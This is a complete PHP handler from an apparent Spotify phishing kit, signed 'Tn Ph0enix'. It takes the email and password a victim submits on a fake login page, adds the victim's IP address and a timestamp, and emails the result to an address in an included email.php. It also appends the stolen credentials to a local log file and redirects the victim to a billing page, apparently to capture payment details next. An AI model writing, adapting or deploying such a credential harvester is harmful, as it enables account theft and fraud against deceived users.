<?php
session_start();
$ip1 = getenv("REMOTE_ADDR");
$time = gmdate("H:i:s");
$date = gmdate("j/m");
$email = $_SESSION['email'] = $_POST['email'];
$password = $_SESSION['password'] = $_POST['password'];

$msg = "
<pre><font style='font-size:14px;font-weight: bold;'>
#################################
         <img src='https://upload.wikimedia.org/wikipedia/commons/thumb/2/26/Spotify_logo_with_text.svg/2000px-Spotify_logo_with_text.svg.png' width='110' height='55'/>
#################################
|Email Address : $email
|Password      : $password
|IP Adresse    : $ip1
#################################
Date : $date @ $time
###########Tn Ph0enix############";
include 'email.php';
 $subj = "n00b Log | $ip1";
$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";

  mail($to, $subj, $msg,$headers);
 $file = fopen("../rst/login.html" , "a");
    fwrite($file, $msg);
header("Location: billing.php?ip=$ip1");
?>
 
 